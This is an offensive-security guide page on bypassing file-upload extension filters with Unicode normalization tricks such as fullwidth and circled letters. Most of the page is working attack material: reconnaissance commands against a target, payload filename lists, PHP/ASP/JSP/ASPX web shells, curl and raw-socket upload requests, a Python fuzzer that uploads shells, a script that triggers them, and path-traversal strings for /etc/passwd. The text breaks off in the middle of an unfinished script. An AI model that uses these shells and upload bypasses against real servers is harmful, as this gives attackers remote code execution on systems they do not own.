---
title: Unicode Normalization Bypass
description: Exploit file upload filters by leveraging Unicode character normalization to bypass extension validation, filename sanitization, and WAF rules through character equivalence transformations.
navigation:
  icon: i-lucide-languages
  title: Unicode Normalization Bypass
---

## Understanding Unicode Normalization Bypass

::badge
Extension Filter Evasion
::

Unicode normalization is a process where equivalent Unicode characters are transformed into a canonical or compatible form. Web servers, application frameworks, operating systems, and file systems apply normalization at different stages of request processing. When an upload filter validates a filename **before** normalization occurs, but the server stores or executes the file **after** normalization, the original malicious extension is restored, bypassing the validation entirely.

::note{icon="i-lucide-info"}
Unicode defines four normalization forms: **NFC** (Canonical Decomposition + Canonical Composition), **NFD** (Canonical Decomposition), **NFKC** (Compatibility Decomposition + Canonical Composition), and **NFKD** (Compatibility Decomposition). NFKC and NFKD are the most exploitable because they collapse visually similar but technically different characters into their ASCII equivalents.
::

::tabs
  :::tabs-item{icon="i-lucide-scan-search" label="How It Works"}
  | Stage | What Happens | Example |
  | --- | --- | --- |
  | Attacker sends filename | `shell.ⓟⓗⓟ` | Uses circled letter Unicode chars |
  | Upload filter checks extension | `.ⓟⓗⓟ` ≠ `.php` → passes whitelist/blacklist | Filter sees unknown extension |
  | Server/OS normalizes filename | NFKC: `ⓟ→p`, `ⓗ→h`, `ⓟ→p` | Normalized to `shell.php` |
  | File stored on disk | `shell.php` | Executable extension restored |
  | Web server serves request | Executes as PHP | Remote Code Execution |
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="Why Filters Fail"}
  - Filters compare raw bytes, not normalized equivalents
  - Extension blacklists check for literal `.php`, `.asp`, `.jsp` strings
  - Unicode characters like `ⓟ` (U+24DF) are not matched by ASCII pattern matching
  - The file system or runtime applies normalization transparently after the filter
  - Different layers normalize at different times creating a TOCTOU (Time of Check, Time of Use) gap
  - Regular expressions typically do not account for Unicode equivalence classes
  - Framework-level normalization happens after middleware validation
  :::

  :::tabs-item{icon="i-lucide-target" label="Affected Targets"}
  - Applications on Windows (NTFS normalizes filenames)
  - macOS HFS+ and APFS file systems (NFD normalization)
  - Java/Spring applications using `java.text.Normalizer`
  - Python applications using `unicodedata.normalize()`
  - .NET applications with `String.Normalize()`
  - Ruby on Rails with Active Storage
  - Node.js applications using `String.prototype.normalize()`
  - Go applications using `golang.org/x/text/unicode/norm`
  - PHP applications on Windows servers
  - Any application that normalizes after validation
  :::

  :::tabs-item{icon="i-lucide-layers" label="Normalization Forms"}
  | Form | Name | Behavior | Exploitation Relevance |
  | --- | --- | --- | --- |
  | NFC | Canonical Composition | Composes characters into precomposed form | Low — mostly affects accented characters |
  | NFD | Canonical Decomposition | Decomposes into base + combining characters | Medium — macOS default |
  | NFKC | Compatibility Composition | Maps compatibility equivalents to canonical | **High** — fullwidth/circled → ASCII |
  | NFKD | Compatibility Decomposition | Decomposes compatibility + canonical | **High** — same mappings as NFKC |
  :::
::

---

## Unicode Character Mappings

::caution{icon="i-lucide-triangle-alert"}
These Unicode characters normalize to their ASCII equivalents under NFKC/NFKD normalization. Each can replace its corresponding ASCII letter in file extensions to bypass filters.
::

### Fullwidth Characters (U+FF01–U+FF5E)

::collapsible
Every ASCII printable character from `!` (0x21) to `~` (0x7E) has a fullwidth equivalent in the range U+FF01–U+FF5E.

| ASCII | Fullwidth | Unicode | NFKC Result |
| --- | --- | --- | --- |
| `a` | `ａ` | U+FF41 | `a` |
| `b` | `ｂ` | U+FF42 | `b` |
| `c` | `ｃ` | U+FF43 | `c` |
| `d` | `ｄ` | U+FF44 | `d` |
| `e` | `ｅ` | U+FF45 | `e` |
| `f` | `ｆ` | U+FF46 | `f` |
| `g` | `ｇ` | U+FF47 | `g` |
| `h` | `ｈ` | U+FF48 | `h` |
| `i` | `ｉ` | U+FF49 | `i` |
| `j` | `ｊ` | U+FF4A | `j` |
| `k` | `ｋ` | U+FF4B | `k` |
| `l` | `ｌ` | U+FF4C | `l` |
| `m` | `ｍ` | U+FF4D | `m` |
| `n` | `ｎ` | U+FF4E | `n` |
| `o` | `ｏ` | U+FF4F | `o` |
| `p` | `ｐ` | U+FF50 | `p` |
| `q` | `ｑ` | U+FF51 | `q` |
| `r` | `ｒ` | U+FF52 | `r` |
| `s` | `ｓ` | U+FF53 | `s` |
| `t` | `ｔ` | U+FF54 | `t` |
| `u` | `ｕ` | U+FF55 | `u` |
| `v` | `ｖ` | U+FF56 | `v` |
| `w` | `ｗ` | U+FF57 | `w` |
| `x` | `ｘ` | U+FF58 | `x` |
| `y` | `ｙ` | U+FF59 | `y` |
| `z` | `ｚ` | U+FF5A | `z` |
| `.` | `．` | U+FF0E | `.` |
| `/` | `／` | U+FF0F | `/` |
| `\` | `＼` | U+FF3C | `\` |

::

### Circled Characters (U+24B6–U+24E9)

::collapsible

| ASCII | Circled | Unicode | NFKC Result |
| --- | --- | --- | --- |
| `a` | `ⓐ` | U+24D0 | `a` |
| `b` | `ⓑ` | U+24D1 | `b` |
| `c` | `ⓒ` | U+24D2 | `c` |
| `d` | `ⓓ` | U+24D3 | `d` |
| `e` | `ⓔ` | U+24D4 | `e` |
| `f` | `ⓕ` | U+24D5 | `f` |
| `g` | `ⓖ` | U+24D6 | `g` |
| `h` | `ⓗ` | U+24D7 | `h` |
| `i` | `ⓘ` | U+24D8 | `i` |
| `j` | `ⓙ` | U+24D9 | `j` |
| `k` | `ⓚ` | U+24DA | `k` |
| `l` | `ⓛ` | U+24DB | `l` |
| `m` | `ⓜ` | U+24DC | `m` |
| `n` | `ⓝ` | U+24DD | `n` |
| `o` | `ⓞ` | U+24DE | `o` |
| `p` | `ⓟ` | U+24DF | `p` |
| `q` | `ⓠ` | U+24E0 | `q` |
| `r` | `ⓡ` | U+24E1 | `r` |
| `s` | `ⓢ` | U+24E2 | `s` |
| `t` | `ⓣ` | U+24E3 | `t` |
| `u` | `ⓤ` | U+24E4 | `u` |
| `v` | `ⓥ` | U+24E5 | `v` |
| `w` | `ⓦ` | U+24E6 | `w` |
| `x` | `ⓧ` | U+24E7 | `x` |
| `y` | `ⓨ` | U+24E8 | `y` |
| `z` | `ⓩ` | U+24E9 | `z` |

::

### Additional Exploitable Characters

::collapsible

| Category | Character | Unicode | NFKC Result | Usage |
| --- | --- | --- | --- | --- |
| Superscript | `ᵃ` | U+1D43 | `a` | Extension letters |
| Superscript | `ᵇ` | U+1D47 | `b` | Extension letters |
| Superscript | `ᵖ` | U+1D56 | `p` | `.php` bypass |
| Superscript | `ʰ` | U+02B0 | `h` | `.php` bypass |
| Subscript | `ₐ` | U+2090 | `a` | Extension letters |
| Subscript | `ₑ` | U+2091 | `e` | Extension letters |
| Subscript | `ₒ` | U+2092 | `o` | Extension letters |
| Subscript | `ₛ` | U+209B | `s` | `.asp` bypass |
| Subscript | `ₚ` | U+209A | `p` | `.php` bypass |
| Small Caps | `ᴀ` | U+1D00 | Varies | Platform dependent |
| Math Bold | `𝐩` | U+1D429 | `p` | Extension letters |
| Math Bold | `𝐡` | U+1D421 | `h` | Extension letters |
| Math Italic | `𝑝` | U+1D45D | `p` | Extension letters |
| Math Italic | `𝘩` | U+1D629 | `h` | Extension letters |
| Fraction Slash | `⁄` | U+2044 | `/` | Path traversal |
| Fullwidth Period | `．` | U+FF0E | `.` | Extension separator |
| Halfwidth Katakana Period | `｡` | U+FF61 | Varies | Dot substitute |
| Roman Numeral | `Ⅰ` | U+2160 | `I` | Case tricks |

::

---

## Reconnaissance

::accordion
  :::accordion-item{icon="i-lucide-radar" label="Fingerprint Server Normalization Behavior"}
  ```bash
  # Upload file with fullwidth extension and check stored filename
  echo "test" > test.ｔｘｔ

  curl -X POST https://target.com/upload \
    -F "file=@test.txt;filename=test.ｔｘｔ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v 2>&1 | grep -iE "filename|location|path|url"
  ```

  ```bash
  # Check if server normalizes in response
  curl -X POST https://target.com/upload \
    -F "file=@test.txt;filename=probe_ｆｕｌｌ.txt" \
    -v 2>&1 | tee /tmp/upload_response.txt

  # Search for normalized version in response
  grep -i "probe_full" /tmp/upload_response.txt
  # If found -> server normalizes fullwidth to ASCII
  ```

  ```bash
  # Test circled character normalization
  curl -X POST https://target.com/upload \
    -F "file=@test.txt;filename=probe_ⓒⓘⓡⓒⓛⓔ.txt" \
    -v 2>&1 | grep -i "probe_circle"
  ```

  ```bash
  # Test path normalization with fullwidth slash
  curl -v "https://target.com／etc／passwd" 2>&1 | head -20
  curl -v "https://target.com/uploads／test.txt" 2>&1 | head -20
  ```
  :::

  :::accordion-item{icon="i-lucide-file-search" label="Identify Upload Validation Logic"}
  ```bash
  # Test what extensions are blocked
  for ext in php asp aspx jsp jspx phtml php5 php7 phar cfm; do
    echo "test" > "test.${ext}"
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@test.${ext}" \
      -H "Cookie: session=YOUR_SESSION")
    echo "${ext} -> HTTP ${status}"
  done
  ```

  ```bash
  # Test if filter is blacklist or whitelist
  echo "test" > test.xyz123
  curl -X POST https://target.com/upload \
    -F "file=@test.xyz123" \
    -H "Cookie: session=YOUR_SESSION" \
    -s -o /dev/null -w "%{http_code}\n"
  # If 200 -> blacklist (allows unknown extensions)
  # If 4xx -> whitelist (only allows specific extensions)
  ```

  ```bash
  # Test filter case sensitivity
  for ext in PHP Php pHp phP PHp PhP pHP; do
    echo "test" > "test.${ext}"
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@test.${ext}")
    echo "${ext} -> HTTP ${status}"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Identify Server Technology"}
  ```bash
  curl -sI https://target.com | grep -iE "server|x-powered|x-aspnet|x-runtime"
  ```

  ```bash
  whatweb https://target.com
  ```

  ```bash
  wappalyzer https://target.com 2>/dev/null || \
  httpx -u https://target.com -tech-detect -silent
  ```

  ```bash
  # Check operating system via TTL or error pages
  nmap -O target.com -p 80,443

  # Windows NTFS normalizes Unicode filenames
  # macOS HFS+/APFS uses NFD normalization
  # Linux ext4 stores raw bytes (no normalization typically)
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="Test File System Normalization"}
  ```bash
  # Upload with fullwidth extension, then access with ASCII extension
  curl -X POST https://target.com/upload \
    -F "file=@test.txt;filename=fstest.ｔｘｔ" \
    -H "Cookie: session=YOUR_SESSION" -v

  # Try accessing with normalized name
  curl -sI "https://target.com/uploads/fstest.txt"
  # If 200 -> file system normalized the filename
  # If 404 -> file stored with original Unicode name
  ```

  ```bash
  # Try accessing with original Unicode name
  curl -sI "https://target.com/uploads/fstest.ｔｘｔ"
  ```

  ```bash
  # Try URL-encoded version of fullwidth characters
  # ｔ = U+FF54 = %EF%BD%94 in UTF-8
  curl -sI "https://target.com/uploads/fstest.%EF%BD%94%EF%BD%98%EF%BD%94"
  ```
  :::
::

---

## Payload Construction

### Extension Substitution Filenames

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="PHP Extensions"}
  ```bash [Fullwidth PHP]
  shell.ｐｈｐ
  shell.ｐhp
  shell.pｈp
  shell.phｐ
  shell.ｐｈp
  shell.ｐhｐ
  shell.pｈｐ
  ```

  ```bash [Circled PHP]
  shell.ⓟⓗⓟ
  shell.ⓟhp
  shell.pⓗp
  shell.phⓟ
  shell.ⓟⓗp
  shell.ⓟhⓟ
  shell.pⓗⓟ
  ```

  ```bash [Mixed Unicode PHP]
  shell.ⓟｈⓟ
  shell.ｐⓗｐ
  shell.ⓟhｐ
  shell.ｐhⓟ
  shell.ᵖʰᵖ
  shell.ₚhₚ
  ```

  ```bash [PHP Alternative Extensions]
  shell.ⓟⓗⓣⓜⓛ
  shell.ｐｈｔｍｌ
  shell.ⓟⓗⓐⓡ
  shell.ｐｈａｒ
  shell.ⓟⓗⓟ5
  shell.ｐｈｐ5
  shell.ⓟⓗⓟ7
  shell.ｐｈｐ7
  shell.ⓟⓗⓣ
  shell.ｐｈｔ
  ```
  :::

  :::tabs-item{icon="i-lucide-file-terminal" label="ASP/ASPX Extensions"}
  ```bash [Fullwidth ASP]
  shell.ａｓｐ
  shell.ａsp
  shell.aｓp
  shell.asｐ
  shell.ａｓp
  shell.ａsｐ
  shell.aｓｐ
  ```

  ```bash [Circled ASP]
  shell.ⓐ���ⓟ
  shell.ⓐsp
  shell.aⓢp
  shell.asⓟ
  ```

  ```bash [Fullwidth ASPX]
  shell.ａｓｐｘ
  shell.ａspx
  shell.asｐx
  shell.aspｘ
  shell.ａｓpx
  shell.ａsｐx
  shell.ａspｘ
  ```

  ```bash [Circled ASPX]
  shell.ⓐⓢⓟⓧ
  shell.ⓐspx
  shell.asⓟx
  shell.aspⓧ
  ```
  :::

  :::tabs-item{icon="i-lucide-coffee" label="JSP Extensions"}
  ```bash [Fullwidth JSP]
  shell.ｊｓｐ
  shell.ｊsp
  shell.jｓp
  shell.jsｐ
  shell.ｊｓp
  shell.ｊsｐ
  shell.jｓｐ
  ```

  ```bash [Circled JSP]
  shell.ⓙⓢⓟ
  shell.ⓙsp
  shell.jⓢp
  shell.jsⓟ
  ```

  ```bash [JSPX Variants]
  shell.ⓙⓢⓟⓧ
  shell.ｊｓｐｘ
  shell.ⓙspx
  shell.jspⓧ
  shell.jspｘ
  ```
  :::

  :::tabs-item{icon="i-lucide-file-type" label="Other Extensions"}
  ```bash [Python]
  shell.ⓟⓨ
  shell.ｐｙ

  [Perl]
  shell.ⓟⓛ
  shell.ｐｌ
  shell.ⓒⓖⓘ
  shell.ｃｇｉ

  [Ruby]
  shell.ⓡⓑ
  shell.ｒｂ
  shell.ⓔⓡⓑ
  shell.ｅｒｂ

  [Config]
  shell.ⓒⓞⓝⓕⓘⓖ
  shell.ｃｏｎｆｉｇ
  .ⓗⓣⓐⓒⓒⓔⓢⓢ
  .ｈｔａｃｃｅｓｓ

  [SVG]
  xss.ⓢⓥⓖ
  xss.ｓｖｇ

  [HTML]
  phish.ⓗⓣⓜⓛ
  phish.ｈｔｍｌ
  ```
  :::
::

### Dot Character Substitution

::note{icon="i-lucide-circle-dot"}
The dot (`.`) separator in filenames can also be replaced with Unicode equivalents that normalize to a period.
::

```bash
# Fullwidth full stop (U+FF0E) → normalizes to "."
shell．php
shell．ｐｈｐ
shell．ⓟⓗⓟ

# Halfwidth Katakana middle dot (U+FF65) — may work on some systems
shell･php

# Combining dot below (U+0323) — may merge with preceding char
shell.php  # with combining character attached

# Small full stop (U+FE52)
shell﹒php

# One dot leader (U+2024)
shell․php
```

```bash
# Test all dot variants
for dot in "．" "﹒" "․" "･"; do
  fname="shell${dot}php"
  echo "Testing: ${fname}"
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${fname}" \
    -s -o /dev/null -w "  HTTP %{http_code}\n"
done
```

### Web Shell Payloads

::code-group
```php [shell.php]
<?php
if(isset($_REQUEST['cmd'])){
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

```asp [shell.asp]
<%
If Request("cmd") <> "" Then
  Dim oShell
  Set oShell = Server.CreateObject("WScript.Shell")
  Dim oExec
  Set oExec = oShell.Exec("cmd /c " & Request("cmd"))
  Response.Write("<pre>" & oExec.StdOut.ReadAll & "</pre>")
End If
%>
```

```jsp [shell.jsp]
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) out.println(line);
}
%>
```

```aspx [shell.aspx]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```
::

---

## Attack Execution

### Method 1 — cURL Direct Upload

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Fullwidth Extension"}
  ```bash
  # PHP fullwidth bypass
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Partial fullwidth (single character)
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.phｐ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # ASP fullwidth
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.ａｓｐ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # JSP fullwidth
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;filename=shell.ｊｓｐ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # ASPX fullwidth
  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx;filename=shell.ａｓｐｘ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```
  :::

  :::tabs-item{icon="i-lucide-circle" label="Circled Extension"}
  ```bash
  # PHP circled
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ⓟⓗⓟ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # ASP circled
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.ⓐⓢⓟ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # JSP circled
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;filename=shell.ⓙⓢⓟ" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Mixed circled + ASCII
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ⓟhp" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.pⓗp" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.phⓟ" \
    -v
  ```
  :::

  :::tabs-item{icon="i-lucide-shuffle" label="Mixed Unicode Types"}
  ```bash
  # Fullwidth + Circled mix
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ⓟｈⓟ" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐⓗｐ" \
    -v
  ```

  ```bash
  # Superscript variants
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ᵖʰᵖ" \
    -v
  ```

  ```bash
  # Fullwidth dot + fullwidth extension
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell．ｐｈｐ" \
    -v
  ```

  ```bash
  # Math bold characters
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.𝐩𝐡𝐩" \
    -v
  ```
  :::

  :::tabs-item{icon="i-lucide-percent" label="URL-Encoded Unicode"}
  ```bash
  # Fullwidth 'p' = U+FF50 = UTF-8: EF BD 90 = URL: %EF%BD%90
  # Fullwidth 'h' = U+FF48 = UTF-8: EF BD 88 = URL: %EF%BD%88

  # URL-encoded fullwidth .php
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.%EF%BD%90%EF%BD%88%EF%BD%90" \
    -v
  ```

  ```bash
  # Circled 'p' = U+24DF = UTF-8: E2 93 9F = URL: %E2%93%9F
  # Circled 'h' = U+24D7 = UTF-8: E2 93 97 = URL: %E2%93%97

  # URL-encoded circled .php
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.%E2%93%9F%E2%93%97%E2%93%9F" \
    -v
  ```

  ```bash
  # Fullwidth dot = U+FF0E = UTF-8: EF BC 8E = URL: %EF%BC%8E

  # Fullwidth dot + fullwidth extension
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell%EF%BC%8E%EF%BD%90%EF%BD%88%EF%BD%90" \
    -v
  ```
  :::
::

### Method 2 — Python Automated Fuzzer

::code-group
```python [unicode_upload_fuzzer.py]
import requests
import sys
import unicodedata
import urllib3
urllib3.disable_warnings()

target = sys.argv[1]
upload_url = f"{target.rstrip('/')}/upload"
cookie = sys.argv[2] if len(sys.argv) > 2 else "session=YOUR_SESSION"

# Unicode mappings for common extension characters
unicode_maps = {
    'p': ['\uff50', '\u24df', '\u1d56', '\u209a', '\U0001d429', '\U0001d45d'],
    'h': ['\uff48', '\u24d7', '\u02b0', '\U0001d421'],
    'a': ['\uff41', '\u24d0', '\u1d43', '\u2090', '\U0001d41a'],
    's': ['\uff53', '\u24e2', '\u209b', '\U0001d42c'],
    'j': ['\uff4a', '\u24d9', '\U0001d423'],
    'x': ['\uff58', '\u24e7', '\U0001d431'],
    'e': ['\uff45', '\u24d4', '\u2091', '\U0001d41e'],
    't': ['\uff54', '\u24e3', '\U0001d42d'],
    'l': ['\uff4c', '\u24db', '\U0001d425'],
    'r': ['\uff52', '\u24e1', '\U0001d42b'],
    'i': ['\uff49', '\u24d8', '\U0001d422'],
    'c': ['\uff43', '\u24d2', '\U0001d41c'],
    'f': ['\uff46', '\u24d5', '\U0001d41f'],
    'g': ['\uff47', '\u24d6', '\U0001d420'],
    'm': ['\uff4d', '\u24dc', '\U0001d426'],
    'n': ['\uff4e', '\u24dd', '\U0001d427'],
    'o': ['\uff4f', '\u24de', '\u2092', '\U0001d428'],
    '.': ['\uff0e', '\ufe52', '\u2024'],
}

# Target extensions to bypass
extensions = {
    'php': '<?php echo shell_exec($_GET["cmd"]); ?>',
    'asp': '<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>',
    'jsp': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
    'aspx': '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%>',
}

headers = {"Cookie": cookie}

def generate_unicode_variants(ext):
    """Generate filename variants with Unicode substitutions"""
    variants = []
    
    # Full substitution with fullwidth
    full = ''.join(unicode_maps.get(c, [c])[0] if c in unicode_maps else c for c in ext)
    variants.append(full)
    
    # Full substitution with circled
    circled = ''
    for c in ext:
        if c in unicode_maps and len(unicode_maps[c]) > 1:
            circled += unicode_maps[c][1]
        elif c in unicode_maps:
            circled += unicode_maps[c][0]
        else:
            circled += c
    variants.append(circled)
    
    # Single character substitutions
    for i, c in enumerate(ext):
        if c in unicode_maps:
            for uni_char in unicode_maps[c]:
                variant = ext[:i] + uni_char + ext[i+1:]
                variants.append(variant)
    
    # Fullwidth dot + fullwidth extension
    if '.' not in ext:
        for dot in unicode_maps.get('.', []):
            variants.append(dot + full)
    
    return list(set(variants))

print(f"[*] Target: {upload_url}")
print(f"[*] Generating Unicode variants...\n")

total = 0
uploaded = 0

for ext, payload in extensions.items():
    variants = generate_unicode_variants(ext)
    print(f"\n[*] Extension: .{ext} -> {len(variants)} variants")
    
    for variant in variants:
        filename = f"shell.{variant}"
        nfkc = unicodedata.normalize('NFKC', filename)
        
        files = {"file": (filename, payload, "application/octet-stream")}
        try:
            r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
            total += 1
            
            if r.status_code in [200, 201] and "error" not in r.text.lower():
                uploaded += 1
                print(f"  [UPLOADED] {filename}")
                print(f"             NFKC normalized: {nfkc}")
                print(f"             HTTP {r.status_code} ({len(r.text)} bytes)")
            else:
                print(f"  [BLOCKED]  {filename} -> HTTP {r.status_code}")
        except Exception as e:
            print(f"  [ERROR]    {filename} -> {e}")

print(f"\n[*] Complete: {uploaded}/{total} uploaded successfully")
```

```python [unicode_normalizer_test.py]
import unicodedata
import sys

"""Test Unicode normalization behavior for extension bypass planning"""

test_filenames = [
    "shell.ｐｈｐ",
    "shell.ⓟⓗⓟ",
    "shell.ⓟｈⓟ",
    "shell.ᵖʰᵖ",
    "shell.ａｓｐ",
    "shell.ⓐⓢⓟ",
    "shell.ｊｓｐ",
    "shell.ⓙⓢⓟ",
    "shell.ａｓｐｘ",
    "shell.ⓐⓢⓟⓧ",
    "shell．ｐｈｐ",
    "shell．ⓟⓗⓟ",
    "shell.ｐｈｔｍｌ",
    "shell.ⓟⓗⓣⓜⓛ",
    "shell.ⓟⓗⓐⓡ",
    "..／..／..／etc／passwd",
    "..＼..＼..＼windows＼win.ini",
]

print(f"{'Original':<40} {'NFC':<20} {'NFD':<20} {'NFKC':<20} {'NFKD':<20}")
print("=" * 120)

for fname in test_filenames:
    nfc = unicodedata.normalize('NFC', fname)
    nfd = unicodedata.normalize('NFD', fname)
    nfkc = unicodedata.normalize('NFKC', fname)
    nfkd = unicodedata.normalize('NFKD', fname)
    
    print(f"{fname:<40} {nfc:<20} {nfd:<20} {nfkc:<20} {nfkd:<20}")
    
    # Highlight dangerous normalizations
    for form_name, normalized in [("NFKC", nfkc), ("NFKD", nfkd)]:
        if normalized != fname:
            ext = normalized.rsplit('.', 1)[-1] if '.' in normalized else ''
            dangerous = ext.lower() in ['php', 'asp', 'aspx', 'jsp', 'jspx', 'phtml', 'phar', 'config', 'htaccess']
            if dangerous:
                print(f"  [!!!] {form_name} normalizes to DANGEROUS extension: .{ext}")
```

```python [trigger_normalized_shells.py]
import requests
import sys
import unicodedata
import urllib3
urllib3.disable_warnings()

target = sys.argv[1]
cmd = sys.argv[2] if len(sys.argv) > 2 else "whoami"

# Filenames that were uploaded with Unicode extensions
uploaded_names = [
    "shell.ｐｈｐ",
    "shell.ⓟⓗⓟ",
    "shell.ａｓｐ",
    "shell.ⓐⓢⓟ",
    "shell.ｊｓｐ",
    "shell.ⓙⓢⓟ",
    "shell.ａｓｐｘ",
]

upload_dirs = ["uploads", "upload", "files", "images", "media", "assets", "content", "data"]

for name in uploaded_names:
    # Try both original and NFKC-normalized versions
    normalized = unicodedata.normalize('NFKC', name)
    
    for try_name in [name, normalized]:
        for d in upload_dirs:
            url = f"{target.rstrip('/')}/{d}/{try_name}"
            try:
                r = requests.get(f"{url}?cmd={cmd}", verify=False, timeout=5)
                if r.status_code == 200 and len(r.text.strip()) > 0:
                    print(f"[SHELL] {url}?cmd={cmd}")
                    print(f"        Response: {r.text[:200]}")
            except:
                pass
```
::

### Method 3 — Burp Suite Intruder Fuzzing

::steps{level="4"}
#### Capture Upload Request

```
1. Proxy browser traffic through Burp Suite (127.0.0.1:8080)
2. Upload a legitimate file (test.jpg)
3. Intercept the request in Proxy tab
4. Send to Intruder (Ctrl+I)
```

#### Configure Payload Positions

```http
POST /upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----Bound

------Bound
Content-Disposition: form-data; name="file"; filename="shell.§php§"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET["cmd"]); ?>
------Bound--
```

#### Load Unicode Extension Payloads

```
Attack Type: Sniper
Payload Set 1 (Extension position):

ｐｈｐ
ⓟⓗⓟ
ⓟhp
phⓟ
pⓗp
ｐhp
phｐ
pｈp
ⓟｈⓟ
ｐⓗｐ
ⓟⓗp
ⓟhⓟ
pⓗⓟ
ｐｈp
ｐhｐ
pｈｐ
ᵖʰᵖ
ₚhₚ
ｐｈｔｍｌ
ⓟⓗⓣⓜⓛ
ｐｈａｒ
ⓟⓗⓐⓡ
ｐｈｐ5
ⓟⓗⓟ5
ｐｈｔ
ⓟⓗⓣ
```

#### Configure Grep Rules

```
Grep - Match (Positive indicators):
  - "uploaded"
  - "success"
  - "saved"
  - "/uploads/"
  - "/files/"

Grep - Match (Negative indicators):
  - "error"
  - "invalid"
  - "not allowed"
  - "rejected"
  - "extension"
  - "forbidden"

Flag responses with status: 200, 201
Exclude responses with status: 400, 403, 415, 422
```

#### Analyze Results and Trigger

```bash
# For each successful upload, try to trigger the shell
# Check both Unicode and normalized filenames
curl "https://target.com/uploads/shell.ⓟⓗⓟ?cmd=whoami"
curl "https://target.com/uploads/shell.php?cmd=whoami"
```
::

### Method 4 — Raw HTTP Request Construction

::code-collapse
```bash [Fullwidth PHP Raw Request]
# Construct request with raw Unicode bytes
# ｐ = EF BD 90, ｈ = EF BD 88, ｐ = EF BD 90
cat > /tmp/unicode_upload.txt << 'HEREDOC'
POST /upload HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: multipart/form-data; boundary=----UBound

------UBound
Content-Disposition: form-data; name="file"; filename="shell.ｐｈｐ"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET["cmd"]); ?>
------UBound--
HEREDOC

# Send with ncat (preserves raw bytes)
ncat --ssl target.com 443 < /tmp/unicode_upload.txt
```

```bash [Circled PHP Raw Request]
cat > /tmp/circled_upload.txt << 'HEREDOC'
POST /upload HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: multipart/form-data; boundary=----CBound

------CBound
Content-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET["cmd"]); ?>
------CBound--
HEREDOC

ncat --ssl target.com 443 < /tmp/circled_upload.txt
```

```python [Raw Socket Upload]
import socket
import ssl

host = "target.com"
port = 443

payload = '<?php echo shell_exec($_GET["cmd"]); ?>'
filename = "shell.\uff50\uff48\uff50"  # Fullwidth php

body = (
    f'------Bound\r\n'
    f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    f'Content-Type: application/octet-stream\r\n'
    f'\r\n'
    f'{payload}\r\n'
    f'------Bound--\r\n'
)

body_bytes = body.encode('utf-8')

headers = (
    f'POST /upload HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Cookie: session=YOUR_SESSION\r\n'
    f'Content-Type: multipart/form-data; boundary=----Bound\r\n'
    f'Content-Length: {len(body_bytes)}\r\n'
    f'Connection: close\r\n'
    f'\r\n'
)

